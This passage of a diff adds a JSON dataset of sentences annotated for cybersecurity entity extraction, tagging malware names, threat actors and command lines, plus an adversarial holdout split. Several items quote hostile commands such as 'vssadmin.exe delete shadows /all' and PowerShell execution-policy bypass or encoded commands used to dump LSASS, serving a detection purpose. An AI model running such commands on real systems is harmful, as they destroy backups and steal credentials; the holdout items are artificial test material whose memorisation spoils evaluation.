+        {
+          "start": 15,
+          "end": 23,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "LockBit ransomware encrypted system drives using vssadmin.exe delete shadows /all.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 7,
+          "label": "malware",
+          "text": "LockBit"
+        },
+        {
+          "start": 49,
+          "end": 81,
+          "label": "command-line",
+          "text": "vssadmin.exe delete shadows /all"
+        }
+      ]
+    },
+    {
+      "text": "SSHD daemon accepted key and spawned bash shell process for user administrator.",
+      "entities": [
+        {
+          "start": 37,
+          "end": 41,
+          "label": "command-line",
+          "text": "bash"
+        }
+      ]
+    },
+    {
+      "text": "RedLine stealer gathered browser data and transferred it to server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 7,
+          "label": "malware",
+          "text": "RedLine"
+        }
+      ]
+    },
+    {
+      "text": "CozyBear threat actors executed powershell.exe -ExecutionPolicy Bypass -File payload.ps1.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 32,
+          "end": 88,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass -File payload.ps1"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg0 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg0"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-0.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-0.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg1 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg1"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-1.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-1.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg2 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg2"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-2.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-2.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg3 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg3"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-3.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-3.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg4 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg4"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-4.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-4.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg5 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg5"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-5.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-5.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg6 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg6"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-6.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-6.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg7 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg7"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-7.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-7.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg8 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg8"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-8.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-8.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg9 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 75,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg9"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-9.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "label": "malware",
+          "text": "loader-9.exe"
+        },
+        {
+          "start": 56,
+          "end": 64,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg10 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg10"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-10.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-10.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg11 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg11"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-11.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-11.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg12 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg12"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-12.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-12.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg13 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg13"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-13.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-13.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg14 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg14"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-14.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-14.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg15 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg15"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-15.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-15.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg16 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg16"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-16.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-16.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg17 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg17"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-17.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-17.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg18 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg18"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-18.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-18.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg19 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg19"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-19.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-19.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg20 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg20"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-20.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-20.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg21 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg21"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-21.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-21.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg22 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg22"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-22.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-22.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg23 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg23"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-23.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-23.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators executed powershell.exe -NoProfile -EncodedCommand abcdefg24 to dump LSASS.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 76,
+          "label": "command-line",
+          "text": "powershell.exe -NoProfile -EncodedCommand abcdefg24"
+        }
+      ]
+    },
+    {
+      "text": "The CozyBear campaign executed loader-24.exe to download Mimikatz.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 31,
+          "end": 44,
+          "label": "malware",
+          "text": "loader-24.exe"
+        },
+        {
+          "start": 57,
+          "end": 65,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    }
+  ],
+  "adversarial_holdout": [
+    {
+      "text": "The Microsoft threat researcher Thomas published an analysis.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas launched the phishing campaign against our organization.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        }
+      ]
+    },
+    {
+      "text": "The administrator executed powershell.exe to install security patches.",
+      "entities": [
+        {
+          "start": 27,
+          "end": 41,
+          "label": "command-line",
+          "text": "powershell.exe"
+        }
+      ]
+    },
+    {
+      "text": "The attacker executed powershell.exe to download the malicious payload.",
+      "entities": [
+        {
+          "start": 22,
+          "end": 36,
+          "label": "command-line",
+          "text": "powershell.exe"
+        }
+      ]
+    },
+    {
+      "text": "The security analyst published a paper detailing Cobalt Strike configuration.",
+      "entities": [
+        {
+          "start": 49,
+          "end": 62,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "Cobalt Strike beacon active on domain controller systems.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "Generic trojan detection was triggered by Windows Defender on backup drive.",
+      "entities": []
+    },
+    {
+      "text": "We verified the signature of organization Microsoft on the software package.",
+      "entities": []
+    },
+    {
+      "text": "The security analyst checked the process tree for any suspicious relations.",
+      "entities": []
+    },
+    {
+      "text": "A legitimate svchost.exe binary runs in the background of Windows operating systems.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 24,
+          "label": "command-line",
+          "text": "svchost.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-0.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-0.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-0.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-1.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-1.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-1.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-2.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-2.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-2.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-3.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-3.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-3.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-4.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-4.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-4.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-5.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-5.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-5.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-6.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-6.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-6.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-7.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-7.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-7.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-8.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-8.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-8.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-9.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-9.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "update-9.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-10.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-10.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 54,
+          "label": "malware",
+          "text": "update-10.exe"
+        }
+      ]
+    },
+    {
+      "text": "The administrator Thomas verified that update-11.exe is legitimate software.",
+      "entities": []
+    },
+    {
+      "text": "Threat actor Thomas deployed the malware update-11.exe to the workstation.",
+      "entities": [
+        {
+          "start": 13,
+          "end": 19,
+          "label": "threat-actor",
+          "text": "Thomas"
+        },
+        {
+          "start": 41,
+          "end": 54,
+          "label": "malware",
+          "text": "update-11.exe"
+        }
+      ]
+    }
+  ]
+}
